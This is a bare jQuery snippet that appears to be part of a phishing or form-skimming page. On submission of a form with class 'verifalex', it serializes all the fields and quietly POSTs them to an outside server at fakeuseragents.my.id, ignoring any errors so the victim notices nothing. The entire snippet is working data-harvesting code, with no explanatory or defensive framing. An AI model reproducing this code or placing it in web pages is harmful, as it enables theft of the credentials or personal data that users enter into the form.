$(".verifalex").submit(function() {
	var d = $(".verifalex");

	$.ajax({
        url: "https://fakeuseragents.my.id/klaim/index.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
